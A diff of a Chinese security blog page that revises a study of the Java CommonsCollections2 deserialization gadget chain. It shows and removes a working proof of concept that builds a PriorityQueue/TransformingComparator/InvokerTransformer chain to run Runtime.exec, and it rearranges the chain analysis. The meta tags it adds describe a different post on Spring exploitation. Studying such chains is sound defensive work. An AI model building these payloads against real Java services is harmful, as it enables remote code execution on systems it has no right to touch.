@@ -6,48 +6,19 @@
   <meta name="keywords" content=" Hexo , Markdown ">
   <meta name="description" content="Java反序列化-CommonsCollections2分析 | 六月的雨">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="description" content="Java反序列化CommonsCollections2分析版本要求：  DK版本：无要求 CommonsCollections 4.0(cc3.1中TransformingComparator没有继承自Serializable所以无法进行Java反序列化)  具备知识：  反射 动态代理 javassist ClassLoader#defineClass TemplatesImpl  添加依赖：">
+<meta name="description" content="推荐资料：  SpringBootVulExploit  Spring 框架漏洞集合  Spring Boot Actuator H2 RCE复现  Spring Boot Actuator(eureka xstream deserialization RCE)   Spring 是为解决企业应用开发的复杂性而创建的一个开源框架。主要的设计思想是有两个：  控制反转IOCIOC是一种设计思想，将原">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Java反序列化-CommonsCollections2分析">
-<meta property="og:url" content="http://example.com/2021/12/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CommonsCollections2%E5%88%86%E6%9E%90/index.html">
+<meta property="og:title" content="应用安全-Spring利用方式">
+<meta property="og:url" content="http://example.com/2021/11/20/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8-Spring%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/index.html">
 <meta property="og:site_name" content="六月的雨">
-<meta property="og:description" content="Java反序列化CommonsCollections2分析版本要求：  DK版本：无要求 CommonsCollections 4.0(cc3.1中TransformingComparator没有继承自Serializable所以无法进行Java反序列化)  具备知识：  反射 动态代理 javassist ClassLoader#defineClass TemplatesImpl  添加依赖：">
+<meta property="og:description" content="推荐资料：  SpringBootVulExploit  Spring 框架漏洞集合  Spring Boot Actuator H2 RCE复现  Spring Boot Actuator(eureka xstream deserialization RCE)   Spring 是为解决企业应用开发的复杂性而创建的一个开源框架。主要的设计思想是有两个：  控制反转IOCIOC是一种设计思想，将原">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://static.tianshouzhi.com/ueditor/upload/image/20170429/1493459043588069152.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207095605754.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207095753071.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207100209490.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207100452403.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207100532469.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207100729212.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207101514337.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211208142627069.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207155253060.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207155417381.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207155753453.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207171552395.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207171832993.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207171730170.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207172625630.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207172842788.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207173108483.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211208112808772.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211208112852872.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211208113438294.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211208113732686.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211208113854787.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211208115229516.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211208115307527.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211208161642509.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211208161936710.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211208162850106.png">
-<meta property="article:published_time" content="2021-12-06T14:00:12.000Z">
-<meta property="article:modified_time" content="2021-12-08T09:47:45.704Z">
+<meta property="article:published_time" content="2021-11-20T14:19:40.000Z">
+<meta property="article:modified_time" content="2021-11-20T14:19:48.466Z">
 <meta property="article:author" content="juneRain">
 <meta property="article:tag" content="Hexo">
 <meta property="article:tag" content="Markdown">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://static.tianshouzhi.com/ueditor/upload/image/20170429/1493459043588069152.png">
 
 
 <link rel="icon" href="/img/1.jpg">
@@ -371,7 +342,7 @@
     </div>
 </div>
 <input type="hidden" id="yelog_site_posts_number" value="27">
-<input type="hidden" id="yelog_site_word_count" value="32.4k">
+<input type="hidden" id="yelog_site_word_count" value="31.9k">
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
     <span id="busuanzi_value_site_pv"></span>
@@ -694,12 +665,12 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2021-12-08 17:47:45'>2021-12-06 22:00</time>
+            Created At : <time class="date" title='Updated At: 2021-12-08 20:35:49'>2021-12-06 22:00</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:3.8k</span>
+        <span>Count:3.3k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -729,7 +700,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CommonsCollections2%E5%88%86%E6%9E%90"><span class="toc-text">Java反序列化CommonsCollections2分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-text">0x01利用链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-javassist%E5%AD%A6%E4%B9%A0"><span class="toc-text">0x02 javassist学习</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-ClassLoader-defineClass"><span class="toc-text">0x04 ClassLoader#defineClass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%EF%BC%88%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%89%EF%BC%9A"><span class="toc-text">0x05 利用链分析（命令执行）：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%EF%BC%88%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%89%EF%BC%9A"><span class="toc-text">0x06 利用链分析（代码执行）：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CPOC%EF%BC%9A"><span class="toc-text">完整的代码执行POC：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-POC%E8%B0%83%E8%AF%95"><span class="toc-text">0x07 POC调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-%E7%96%91%E9%97%AE%E8%A7%A3%E7%AD%94%E8%AE%B0%E5%BD%95"><span class="toc-text">0x08 疑问解答记录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5%EF%BC%9A"><span class="toc-text">参考链接：</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CommonsCollections2%E5%88%86%E6%9E%90"><span class="toc-text">Java反序列化CommonsCollections2分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-text">0x01利用链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-javassist%E5%AD%A6%E4%B9%A0"><span class="toc-text">0x02 javassist学习</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-ClassLoader-defineClass"><span class="toc-text">0x03 ClassLoader#defineClass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%EF%BC%88%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%89%EF%BC%9A"><span class="toc-text">0x04 利用链分析（代码执行）：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-POC%EF%BC%9A"><span class="toc-text">0x05 POC：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-POC%E8%B0%83%E8%AF%95"><span class="toc-text">0x06 POC调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-%E7%96%91%E9%97%AE%E8%A7%A3%E7%AD%94%E8%AE%B0%E5%BD%95"><span class="toc-text">0x07 疑问解答记录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5%EF%BC%9A"><span class="toc-text">参考链接：</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -860,7 +831,7 @@
 <p>name=wangxiaoxiao</p>
 <p>通过反编译工具(例如：JD-gui )打开User.class 可以看到类似以下代码：</p>
 <p><img src="http://static.tianshouzhi.com/ueditor/upload/image/20170429/1493459043588069152.png" alt="Image.png"></p>
-<h2 id="0x04-ClassLoader-defineClass"><a href="#0x04-ClassLoader-defineClass" class="headerlink" title="0x04 ClassLoader#defineClass"></a>0x04 ClassLoader#defineClass</h2><p>ClassLoader是Java的类加载器，负责将字节码转化成内存中的Java类。</p>
+<h2 id="0x03-ClassLoader-defineClass"><a href="#0x03-ClassLoader-defineClass" class="headerlink" title="0x03 ClassLoader#defineClass"></a>0x03 ClassLoader#defineClass</h2><p>ClassLoader是Java的类加载器，负责将字节码转化成内存中的Java类。</p>
 <pre><code>public class JavasistTest &#123;
 
    public static void main(String[] args) throws Exception&#123;
@@ -888,91 +859,7 @@
 &#125;
 </code></pre>
 <p>这里的ClassLoader#defineClass方法是protected所以我们无法直接从外部进行调用，所以我们这里需要借助反射来调用这个方法</p>
-<h2 id="0x05-利用链分析（命令执行）："><a href="#0x05-利用链分析（命令执行）：" class="headerlink" title="0x05 利用链分析（命令执行）："></a>0x05 利用链分析（命令执行）：</h2><p>这条链不是CC2，是利用CC2的前半条链+CC1的后半条链。实现命令执行，但是无法造成代码执行（CC2引入了javassist可以动态生成代码块，所以可以造成代码执行）。如果想直接学CC2，可以看下一节。</p>
-<p>第一步：TransformingComparator#compare方法</p>
-<p><code>TransformingComparator</code>是一个修饰器，和CC1中的<code>ChainedTransformer</code>类似。</p>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207095605754.png" alt="image-20211207095605754"></p>
-<p>可以看到obj1是形参，这个是可控的，然后我们要判断this.transformer是否也是可控的，可以全局搜一下</p>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207095753071.png" alt="image-20211207095753071"></p>
-<p>找到可以使用TransformingComparator的构造器对this.transformer进行赋值，所以this.transformer是可控的，那this.transformer.transform(obj)。我们可以想办法变成InvokerTransformer.transform()，这个应该看起来很熟悉，就是cc1中的后半条链，所以可以触发命令执行，弹计算器。</p>
-<p>第二步：我们需要找到可以调用TransformingComparator，并且重写了readObject作为入口的类，同时这个类也需要具备可序列化的要求。于是我们找到了PriorityQueue。</p>
-<p>PriorityQueue() 使用默认的初始容量（11）创建一个 PriorityQueue，并根据其自然顺序对元素进行排序。</p>
-<p>先查看PriorityQueue#readObject</p>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207100209490.png" alt="image-20211207100209490"></p>
-<p>第一个方框，是对对象s进行序列化，然后存放到数组queue[i]中，这里的queue[i]是序列化得来的，所以是可控的。</p>
-<p>第二个方框，调用了heapify()，我们跟进去</p>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207100452403.png" alt="image-20211207100452403"></p>
-<p>同上，queue[i]是可控的，跟进siftDown()</p>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207100532469.png" alt="image-20211207100532469"></p>
-<p>这里的形参E x就是上面的queue[i]，所以可控。但comparator不为null时，跟进siftDownUsingComparator()</p>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207100729212.png" alt="image-20211207100729212"></p>
-<p>发现在红框处调用了comparator的compare函数, 同上这里的 <code>x</code>是可控的，我们可以看一下comparator是否可控，搜一下，</p>
-<pre><code>private final Comparator&lt;? super E&gt; comparator;
-</code></pre>
-<p>找到comparator是一个参数，可以通过反射进行修改它的值，这里我们可以修改成TransformingComparator。</p>
-<p>到这里我们就可以构造POC了，这里的POC还是比较简单的</p>
-<pre><code>import java.io.FileOutputStream;
-import java.io.ObjectInputStream;
-import java.io.ObjectOutputStream;
-import java.lang.reflect.Field;
-import java.util.PriorityQueue;
-import org.apache.commons.collections4.Transformer;
-import org.apache.commons.collections4.comparators.TransformingComparator;
-import org.apache.commons.collections4.functors.ChainedTransformer;
-import org.apache.commons.collections4.functors.ConstantTransformer;
-import org.apache.commons.collections4.functors.InvokerTransformer;
-public class cc2Test &#123;
-    public static void main(String[] args) throws Exception&#123;
-        //cc1中的后半段链
-        ChainedTransformer chain = new ChainedTransformer(new Transformer[] &#123;
-                new ConstantTransformer(Runtime.class),
-                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;
-                        String.class, Class[].class &#125;, new Object[] &#123;
-                        &quot;getRuntime&quot;, new Class[0] &#125;),
-                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;
-                        Object.class, Object[].class &#125;, new Object[] &#123;
-                        null, new Object[0] &#125;),
-                new InvokerTransformer(&quot;exec&quot;,
-                        new Class[] &#123; String.class &#125;, new Object[]&#123;&quot;calc&quot;&#125;)&#125;);
-        TransformingComparator transformingComparator = new TransformingComparator(chain);
-
-
-        //也可通过构造函数直接进行传入
-        //PriorityQueue queue = new PriorityQueue(1,transformingComparator);
-        PriorityQueue queue = new PriorityQueue(1);
-        queue.add(1);
-        queue.add(2);
-
-        Field field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;comparator&quot;);
-        field.setAccessible(true);
-        field.set(queue,transformingComparator);
-
-        try&#123;
-            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;/Users/20174/Desktop/evil.bin&quot;));
-            outputStream.writeObject(queue);
-            outputStream.close();
-
-            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;/Users/20174/Desktop/evil.bin&quot;));
-            inputStream.readObject();
-        &#125;catch(Exception e)&#123;
-            e.printStackTrace();
-        &#125;
-
-    &#125;
-&#125;
-</code></pre>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207101514337.png" alt="image-20211207101514337"></p>
-<p>对POC的一些代码进行解释</p>
-<p>第一个方框是CC1中后半条链，用于触发pyload</p>
-<p>第二个方框是TransformingComparator</p>
-<p>第三个方框：</p>
-<p>queue.add两次，如果我们只添加一个的话，最终结果会为-1从而无法进入siftDown函数</p>
-<pre><code>private void heapify() &#123;
-    for (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--)
-        siftDown(i, (E) queue[i]);
-&#125;
-</code></pre>
-<h2 id="0x06-利用链分析（代码执行）："><a href="#0x06-利用链分析（代码执行）：" class="headerlink" title="0x06 利用链分析（代码执行）："></a>0x06 利用链分析（代码执行）：</h2><p>这里才是真正的CC2，能够进行RCE。</p>
+<h2 id="0x04-利用链分析（代码执行）："><a href="#0x04-利用链分析（代码执行）：" class="headerlink" title="0x04 利用链分析（代码执行）："></a>0x04 利用链分析（代码执行）：</h2><p>这里才是真正的CC2，能够进行RCE。</p>
 <p>我们先分析后半条链，也就是如何触发RCE的。然后在拼接前半条链，我个人喜欢逆向先知道如何触发RCE，再找入口去调用后半条链。</p>
 <p>第一步：首先我们使用javassist，生成静态代码块，注意：静态代码块会在创建类实例的时候执行。</p>
 <pre><code>import javassist.ClassPool;
@@ -1008,9 +895,29 @@ public class test2 &#123;
                   静态代码块Runtime.exec()
 </code></pre>
 <p>我们需要想办法找到入口调用TemplatesImpl.newTransformer()，来拼接后半条链。</p>
-<p>这里使用了InvokerTransformer#transform的反射来调用TemplatesImpl#newtransformer，我们可以使用前面说到的第一二步，简单化的链我理解长下面这样：</p>
-<p>入口PriorityQueue.readObject()-&gt;&gt;TransformingComparator.compare()–&gt;&gt;InvokerTransformer#transform–&gt;&gt;InvokerTransformer#transform</p>
-<h2 id="完整的代码执行POC："><a href="#完整的代码执行POC：" class="headerlink" title="完整的代码执行POC："></a>完整的代码执行POC：</h2><pre><code>import java.io.FileInputStream;
+<p>这里使用了InvokerTransformer#transform的反射来调用TemplatesImpl#newtransformer。</p>
+<p>第三步：：TransformingComparator#compare方法，主要利用来调用InvokerTransformer#transform，然后拼接后半条链的</p>
+<p>TransformingComparator是一个修饰器，和CC1中的ChainedTransformer类似。</p>
+<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207095605754.png" alt="image-20211207095605754"></p>
+<p>可以看到obj1是形参，这个是可控的，然后我们要判断this.transformer是否也是可控的，可以全局搜一下</p>
+<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207095753071.png" alt="image-20211207095753071"></p>
+<p>找到可以使用TransformingComparator的构造器对this.transformer进行赋值，所以this.transformer是可控的，那this.transformer.transform(obj)。我们可以想办法变成InvokerTransformer.transform()，这个应该看起来很熟悉，就是cc1中的后半条链。</p>
+<p>第四步：我们需要找到可以调用TransformingComparator，并且重写了readObject作为入口的类，同时这个类也需要具备可序列化的要求。于是我们找到了PriorityQueue。</p>
+<p>PriorityQueue() 使用默认的初始容量（11）创建一个 PriorityQueue，并根据其自然顺序对元素进行排序。</p>
+<p>先查看PriorityQueue#readObject</p>
+<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207100209490.png" alt="image-20211207100209490"></p>
+<p>第一个方框，是对对象s进行序列化，然后存放到数组queue[i]中，这里的queue[i]是序列化得来的，所以是可控的。</p>
+<p>第二个方框，调用了heapify()，我们跟进去</p>
+<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207100452403.png" alt="image-20211207100452403"></p>
+<p>同上，queue[i]是可控的，跟进siftDown()</p>
+<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207100532469.png" alt="image-20211207100532469"></p>
+<p>这里的形参E x就是上面的queue[i]，所以可控。当comparator不为null时，跟进siftDownUsingComparator()</p>
+<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207100729212.png" alt="image-20211207100729212"></p>
+<p>发现在红框处调用了comparator的compare函数, 同上这里的 <code>x</code>是可控的，我们可以看一下comparator是否可控，搜一下，</p>
+<pre><code>private final Comparator&lt;? super E&gt; comparator;
+</code></pre>
+<p>找到comparator是一个参数，可以通过反射进行修改它的值，这里我们可以修改成TransformingComparator。</p>
+<h2 id="0x05-POC："><a href="#0x05-POC：" class="headerlink" title="0x05 POC："></a>0x05 POC：</h2><pre><code>import java.io.FileInputStream;
 import java.io.FileOutputStream;
 import java.io.ObjectInputStream;
 import java.io.ObjectOutputStream;
@@ -1071,7 +978,7 @@ public class cc2 &#123;
     &#125;
 &#125;
 </code></pre>
-<h2 id="0x07-POC调试"><a href="#0x07-POC调试" class="headerlink" title="0x07 POC调试"></a>0x07 POC调试</h2><p>调试过程中，我也会对代码进行分析，为啥代码是这样写的</p>
+<h2 id="0x06-POC调试"><a href="#0x06-POC调试" class="headerlink" title="0x06 POC调试"></a>0x06 POC调试</h2><p>如果前面利用链分析看不太懂，可以手动进行调式，可以加深对整条利用链形成的影响。</p>
 <p>从入口进行调试，使用readObject进行反序列化，这里调用的是PriorityQueue重写的的readobject</p>
 <pre><code>inputStream.readObject()
 </code></pre>
@@ -1110,7 +1017,7 @@ field2.set(queue,comparator);
 <p>templatesImpl#getTransletInstance</p>
 <p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211208113732686.png" alt="image-20211208113732686"></p>
 <p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211208113854787.png" alt="image-20211208113854787"></p>
-<h2 id="0x08-疑问解答记录"><a href="#0x08-疑问解答记录" class="headerlink" title="0x08 疑问解答记录"></a>0x08 疑问解答记录</h2><p>1.为什么要设置恶意类的父类为AbstractTranslet?</p>
+<h2 id="0x07-疑问解答记录"><a href="#0x07-疑问解答记录" class="headerlink" title="0x07 疑问解答记录"></a>0x07 疑问解答记录</h2><p>1.为什么要设置恶意类的父类为AbstractTranslet?</p>
 <p>在<code>TemplatesImpl</code>的 <code>defineTransletClasses()</code>函数中在利用defineClass获取到我们的字节码之后会对读取的字节码进行一个判断，判断是否继承自<code>AbstractTranslet</code>，所以我们在javasist生成字节码的时候要设置父类：</p>
 <p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211208115229516.png" alt="image-20211208115229516"></p>
 <p>我们需要令_transletIndex为i，此时的i为0，默认状态下_transletIndex的值为-1，而如果_transletIndex的值小于0，就会抛出异常：</p>
@@ -1159,10 +1066,10 @@ queue.add(2);
 
 <div class="article_copyright">
     <p><span class="copy-title">Title:</span>Java反序列化-CommonsCollections2分析</p>
-    <p><span class="copy-title">Count:</span><span class="post-count">3.8k</span></p>
+    <p><span class="copy-title">Count:</span><span class="post-count">3.3k</span></p>
     <p><span class="copy-title">Author:</span><a  title="juneRain">juneRain</a></p>
     <p><span class="copy-title">Created At:</span>2021-12-06, 22:00:12</p>
-    <p><span class="copy-title">Updated At:</span>2021-12-08, 17:47:45</p>
+    <p><span class="copy-title">Updated At:</span>2021-12-08, 20:35:49</p>
     <span class="copy-title">Url:</span><a class="post-url" href="/2021/12/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CommonsCollections2%E5%88%86%E6%9E%90/" title="Java反序列化-CommonsCollections2分析">http://example.com/2021/12/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CommonsCollections2%E5%88%86%E6%9E%90/</a>
     <p>
         <span class="copy-title">Copyright:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">&#39;Attribution-non-commercial-shared in the same way 4.0&#39;</a> Reprint please keep the original link and author.
